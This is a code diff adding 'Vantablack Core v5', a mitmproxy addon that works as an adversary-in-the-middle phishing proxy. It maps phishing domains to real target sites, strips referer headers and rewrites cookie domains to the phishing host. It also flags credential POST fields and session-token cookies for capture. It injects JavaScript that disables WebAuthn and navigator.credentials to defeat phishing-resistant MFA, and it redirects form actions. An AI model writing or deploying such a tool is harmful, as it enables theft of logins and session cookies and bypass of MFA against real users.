@@ -1,0 +1,402 @@
+"""
+Vantablack Core v5 - Edge Interceptor
+=====================================
+
+Core mitmproxy addon that handles:
+- Request rewriting (Phishing Domain -> Target Domain)
+- Response rewriting (Target Domain -> Phishing Domain)
+- Credential harvesting
+- Session token capture
+- Javascript injection
+"""
+
+import logging
+import re
+try:
+    from mitmproxy import http, ctx
+except Exception:
+    class http:  # type: ignore
+        class HTTPFlow:  # type: ignore
+            pass
+    class ctx:  # type: ignore
+        pass
+from core.edge.phishlets import PhishletConfig, PhishletLoader
+from core.edge.session import SessionManager
+from core.common import config
+from core.common.metrics import RATE_LIMITED, BLOCKED_IP
+import time
+
+class VantaInterceptor:
+    def __init__(self, phishlet: PhishletConfig, session_manager: SessionManager):
+        self.phishlet = phishlet
+        self.session_manager = session_manager
+        self.logger = logging.getLogger("vantablack.edge.interceptor")
+        self.logger.info(f"Interceptor loaded for phishlet: {phishlet.name}")
+        self.limit_per_min = config.get_int("RATE_LIMIT_PER_MINUTE", 120)
+        self.allow_ips = set(config.get_list("ALLOW_IPS"))
+        self.deny_ips = set(config.get_list("DENY_IPS"))
+        self._buckets = {}  # ip -> [timestamps]
+
+    def request(self, flow: http.HTTPFlow):
+        """
+        Handle incoming request:
+        1. Identify session (cookie/path)
+        2. Map host (phishing -> target)
+        3. Strip indicators (referer)
+        4. Path rewrites & blocklist
+        """
+        host = flow.request.pretty_host
+        client_ip = "0.0.0.0"
+        try:
+            client_ip = getattr(flow.client_conn, "address", ("0.0.0.0", 0))[0]  # type: ignore
+        except Exception:
+            pass
+        # ACL
+        if (self.allow_ips and client_ip not in self.allow_ips) or (client_ip in self.deny_ips):
+            try:
+                BLOCKED_IP.labels(ip=client_ip).inc()
+                if hasattr(http, "Response"):
+                    flow.response = http.Response.make(403, b"Forbidden", {})
+                    return
+            except Exception:
+                return
+        # Rate limit
+        now = time.time()
+        bucket = self._buckets.setdefault(client_ip, [])
+        # purge entries older than 60s
+        bucket[:] = [t for t in bucket if now - t < 60]
+        if len(bucket) >= self.limit_per_min:
+            RATE_LIMITED.labels(ip=client_ip).inc()
+            if hasattr(http, "Response"):
+                flow.response = http.Response.make(429, b"Too Many Requests", {})
+                return
+        else:
+            bucket.append(now)
+        
+        # TODO: Dynamic mapping based on loaded phishlet
+        # For prototype, we assume the first proxy_host maps to target
+        target_map = {m.subdomain: m.target for m in self.phishlet.proxy_hosts}
+        
+        # Check if we are hitting a known phishing host
+        # (Simplified matching logic for V5 MVP)
+        mapped = False
+        for phish_sub, target_host in target_map.items():
+            if phish_sub in host:
+                flow.request.host = target_host
+                try:
+                    if not hasattr(flow, "metadata"):
+                        flow.metadata = {}
+                except Exception:
+                    pass
+                try:
+                    flow.metadata["v_ph_host"] = host
+                    flow.metadata["v_tgt_host"] = target_host
+                except Exception:
+                    pass
+                self.logger.debug(f"Rewrote host: {host} -> {target_host}")
+                mapped = True
+                break
+        # Fallback mapping: if no subdomain match, route to first target host of phishlet
+        if not mapped:
+            try:
+                first = next(iter(self.phishlet.proxy_hosts))
+                flow.request.host = first.target
+                try:
+                    flow.request.scheme = "https"
+                except Exception:
+                    pass
+                try:
+                    flow.request.port = 443
+                except Exception:
+                    pass
+                if not hasattr(flow, "metadata"):
+                    flow.metadata = {}
+                flow.metadata["v_ph_host"] = host
+                flow.metadata["v_tgt_host"] = first.target
+                self.logger.debug(f"Fallback host map: {host} -> {first.target}")
+            except Exception:
+                pass
+        
+        # Remove potentially leaking headers
+        if "referer" in flow.request.headers:
+            del flow.request.headers["referer"]
+
+        # Blocklist resources early
+        try:
+            url = getattr(flow.request, "pretty_url", "") or getattr(flow.request, "path", "")
+            for rule in getattr(self.phishlet, "blocklist", []):
+                if re.search(rule.pattern, url):
+                    self.logger.info(f"Blocking resource by rule: {rule.pattern}")
+                    if hasattr(http, "Response"):
+                        flow.response = http.Response.make(204, b"", {"content-type": "text/plain"})
+                    return
+        except Exception:
+            pass
+
+        # Path rewrites
+        try:
+            path = getattr(flow.request, "path", "")
+            method = getattr(flow.request, "method", "GET")
+            # Bridge rules: route certain prefixes to alternate target hosts (e.g., api.x.com)
+            try:
+                for br in getattr(self.phishlet, "bridges", []):
+                    pfx = br.prefix
+                    if pfx and path.startswith(pfx):
+                        new_path = path[len(pfx):] if br.strip_prefix else path
+                        if not new_path.startswith("/"):
+                            new_path = "/" + new_path
+                        flow.request.path = new_path
+                        flow.request.host = br.target_host
+                        try:
+                            flow.request.scheme = "https"
+                        except Exception:
+                            pass
+                        try:
+                            flow.request.port = 443
+                        except Exception:
+                            pass
+                        try:
+                            oh = br.origin_host or br.target_host
+                            flow.request.headers["origin"] = f"https://{oh}"
+                            flow.request.headers["referer"] = f"https://{oh}{new_path}"
+                        except Exception:
+                            pass
+                        try:
+                            if not hasattr(flow, "metadata"):
+                                flow.metadata = {}
+                            flow.metadata["v_tgt_host"] = br.target_host
+                            flow.metadata["v_bridge"] = True
+                            flow.metadata["v_bridge_pfx"] = br.prefix
+                            flow.metadata["v_bridge_cors"] = br.cors or ""
+                            flow.metadata["v_bridge_origin"] = (br.origin_host or br.target_host)
+                        except Exception:
+                            pass
+                        break
+            except Exception:
+                pass
+            for rule in getattr(self.phishlet, "path_rewrites", []):
+                if method in rule.methods and re.search(rule.pattern, path):
+                    new_path = re.sub(rule.pattern, rule.replace, path)
+                    self.logger.debug(f"Rewrote path: {path} -> {new_path}")
+                    flow.request.path = new_path
+        except Exception:
+            pass
+
+        # Capture Credentials (POST)
+        if flow.request.method == "POST":
+            self._scan_for_credentials(flow)
+
+    def response(self, flow: http.HTTPFlow):
+        """
+        Handle outgoing response:
+        1. Map host (target -> phishing) in Location/Cookies
+        2. Inject JS hooks
+        3. Capture session tokens
+        4. Header & Cookie rewrite rules
+        """
+        # 1. Rewrite Location headers
+        if "Location" in flow.response.headers:
+            try:
+                loc = flow.response.headers["Location"]
+                ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
+                tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
+                if ph_host and loc:
+                    from urllib.parse import urlsplit, urlunsplit
+                    sp = urlsplit(loc)
+                    new_netloc = sp.netloc
+                    targets = [m.target for m in getattr(self.phishlet, "proxy_hosts", [])]
+                    if sp.netloc in targets or (tgt_host and sp.netloc == tgt_host):
+                        new_netloc = ph_host
+                    new_loc = urlunsplit((sp.scheme, new_netloc, sp.path, sp.query, sp.fragment))
+                    flow.response.headers["Location"] = new_loc
+            except Exception:
+                pass
+
+        # 2. Capture Set-Cookie
+        self._scan_for_tokens(flow)
+
+        # 2b. Apply cookie rewrite rules
+        try:
+            for rule in getattr(self.phishlet, "cookie_rewrites", []):
+                if rule.name in flow.response.cookies:
+                    value, attrs = flow.response.cookies[rule.name]
+                    if rule.domain_to:
+                        attrs["domain"] = rule.domain_to
+                    if rule.path_to:
+                        attrs["path"] = rule.path_to
+                    if rule.samesite:
+                        attrs["samesite"] = rule.samesite
+                    if rule.secure is not None:
+                        attrs["secure"] = rule.secure
+                    flow.response.cookies[rule.name] = (value, attrs)
+        except Exception:
+            pass
+        # 2b bis. Auto-rewrite cookie domain target -> phishing host (fallback)
+        try:
+            ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
+            tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
+            if ph_host and tgt_host:
+                for name, (value, attrs) in list(flow.response.cookies.items()):
+                    dom = attrs.get("domain")
+                    if dom and (dom == tgt_host or dom.endswith("." + tgt_host)):
+                        attrs["domain"] = ph_host
+                        flow.response.cookies[name] = (value, attrs)
+        except Exception:
+            pass
+
+        # 2c. Header rules
+        try:
+            for hr in getattr(self.phishlet, "headers", []):
+                name = hr.name
+                action = hr.action.lower()
+                if action == "remove":
+                    if name in flow.response.headers:
+                        del flow.response.headers[name]
+                elif action == "set" and hr.value is not None:
+                    flow.response.headers[name] = hr.value
+        except Exception:
+            pass
+        # 2d. Blocklist by mime/size
+        try:
+            url = getattr(flow.request, "pretty_url", "") or getattr(flow.request, "path", "")
+            ctype = flow.response.headers.get("content-type", "")
+            clen = 0
+            try:
+                clen = int(flow.response.headers.get("content-length", "0"))
+            except Exception:
+                clen = len(flow.response.content or b"")
+            for rule in getattr(self.phishlet, "blocklist", []):
+                try:
+                    if rule.pattern and url and not re.search(rule.pattern, url):
+                        continue
+                except Exception:
+                    pass
+                if rule.mimes and not any(m in ctype for m in rule.mimes):
+                    continue
+                if rule.max_kb is not None and clen > rule.max_kb * 1024:
+                    if hasattr(http, "Response"):
+                        flow.response = http.Response.make(204, b"", {"content-type": "text/plain"})
+                        return
+        except Exception:
+            pass
+
+        # 3. Inject Content
+        if flow.response.content:
+            self._inject_scripts(flow)
+        # 3b. CORS fallback patch
+        try:
+            req_origin = flow.request.headers.get("origin")
+            if req_origin and "access-control-allow-origin" not in flow.response.headers:
+                mode = getattr(flow, "metadata", {}).get("v_bridge_cors", "")
+                if mode == "allow_all":
+                    flow.response.headers["access-control-allow-origin"] = "*"
+                    if "access-control-allow-credentials" in flow.response.headers:
+                        del flow.response.headers["access-control-allow-credentials"]
+                else:
+                    flow.response.headers["access-control-allow-origin"] = req_origin
+                    flow.response.headers["access-control-allow-credentials"] = "true"
+                if "access-control-allow-headers" not in flow.response.headers:
+                    flow.response.headers["access-control-allow-headers"] = "Authorization,Content-Type,Accept,Origin,Referer,User-Agent"
+                if "access-control-allow-methods" not in flow.response.headers:
+                    flow.response.headers["access-control-allow-methods"] = "GET,POST,OPTIONS,PUT,DELETE"
+        except Exception:
+            pass
+
+    def _scan_for_credentials(self, flow: http.HTTPFlow):
+        """Analyze POST body for defined credential fields"""
+        try:
+            content = flow.request.get_text(strict=False) if hasattr(flow.request, "get_text") else flow.request.text
+            for rule in self.phishlet.credentials:
+                if rule.type == "post_param" and rule.name:
+                    if re.search(rf"(?:^|&){re.escape(rule.name)}=", content):
+                        self.logger.info(f"Detected credential param: {rule.name}")
+                        # TODO: capture and store via session_manager
+        except Exception:
+            pass
+
+    def _scan_for_tokens(self, flow: http.HTTPFlow):
+        """Analyze Set-Cookie headers for session tokens"""
+        cookies = flow.response.cookies
+        for name, (value, attrs) in cookies.items():
+            # Check against phishlet auth_tokens rules
+            for rule in self.phishlet.auth_tokens:
+                if rule.name == name:
+                    # Capture!
+                    # Need session_id from flow context (to be implemented)
+                    # self.session_manager.capture_token(...)
+                    self.logger.info(f"Captured token candidate: {name}")
+
+    def _inject_scripts(self, flow: http.HTTPFlow):
+        if "text/html" in flow.response.headers.get("content-type", ""):
+            # HTML static URL rewrite for bridges (script/link/img absolute URLs)
+            try:
+                import re as _re
+                for b in getattr(self.phishlet, "bridges", []):
+                    host = _re.escape(b.target_host)
+                    pfx = b.prefix
+                    if not pfx.endswith("/"):
+                        pfx = pfx + "/"
+                    # Protocol-absolute and https absolute
+                    flow.response.text = _re.sub(r'((?:src|href)=["\'])https?://'+host+r'/', r'\1'+pfx, flow.response.text)
+                    flow.response.text = _re.sub(r'((?:src|href)=["\'])//'+host+r'/', r'\1'+pfx, flow.response.text)
+            except Exception:
+                pass
+            # Dynamic bridge injection: reroute fetch/XHR for specified host(s) to local prefixes
+            try:
+                bridges = getattr(self.phishlet, "bridges", [])
+                if bridges:
+                    parts = []
+                    for b in bridges:
+                        host = b.target_host.replace("'", "\\'")
+                        pfx = b.prefix.replace("'", "\\'")
+                        parts.append(f"{{h:'{host}',p:'{pfx}'}}")
+                    arr = "[" + ",".join(parts) + "]"
+                    js_bridge = (
+                        "(function(){try{"
+                        f"var BR={arr};"
+                        "function rw(u){try{var x=new URL(u,window.location.origin);"
+                        "for(var i=0;i<BR.length;i++){var b=BR[i];if(x.host===b.h){return b.p+x.pathname.replace(/^\\//,'')+(x.search||'');}}}catch(e){}return u;}"
+                        "var of=window.fetch;if(of){window.fetch=function(i,n){try{if(typeof i==='string'){i=rw(i);}else if(i&&i.url){var r=rw(i.url);if(r!==i.url)i=new Request(r,i);}}catch(e){}return of.call(this,i,n);};}"
+                        "var xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{u=rw(u);}catch(e){}return xo.apply(this,[m,u].concat([].slice.call(arguments,2)));};"
+                        "if(navigator.credentials){try{"
+                        "if(navigator.credentials.get){navigator.credentials.get=function(){return Promise.reject(new DOMException('Not supported','NotSupportedError'));};}"
+                        "if(navigator.credentials.create){navigator.credentials.create=function(){return Promise.reject(new DOMException('Not supported','NotSupportedError'));};}"
+                        "}catch(e){}}"
+                        "if(window.PublicKeyCredential&&window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable){"
+                        "try{var _old=window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable;"
+                        "window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable=function(){try{return Promise.resolve(false);}catch(e){return _old.call(this);}};"
+                        "}catch(e){}}"
+                        "}catch(e){}})();"
+                    )
+                    if "</body>" in flow.response.text:
+                        flow.response.text = flow.response.text.replace(
+                            "</body>",
+                            f"<script>{js_bridge}</script></body>"
+                        )
+                    else:
+                        flow.response.text = (flow.response.text or "") + f"<script>{js_bridge}</script>"
+            except Exception:
+                pass
+            for injection in self.phishlet.injections:
+                if injection.position == "body_end":
+                    if "</body>" in flow.response.text:
+                        flow.response.text = flow.response.text.replace(
+                            "</body>", 
+                            f"<script>{injection.content}</script></body>"
+                        )
+                    else:
+                        flow.response.text = (flow.response.text or "") + f"<script>{injection.content}</script>"
+            if getattr(self.phishlet, "form_actions", []):
+                parts = []
+                for r in self.phishlet.form_actions:
+                    sel = r.selector.replace("'", "\\'")
+                    act = r.action_to.replace("'", "\\'")
+                    parts.append(f"document.querySelectorAll('{sel}').forEach(function(f){{try{{f.setAttribute('action','{act}')}}catch(e){{}}}});")
+                js = "(function(){try{" + "".join(parts) + "}catch(e){}})();"
+                if "</body>" in flow.response.text:
+                    flow.response.text = flow.response.text.replace(
+                        "</body>",
+                        f"<script>{js}</script></body>"
+                    )
+                else:
+                    flow.response.text = (flow.response.text or "") + f"<script>{js}</script>"
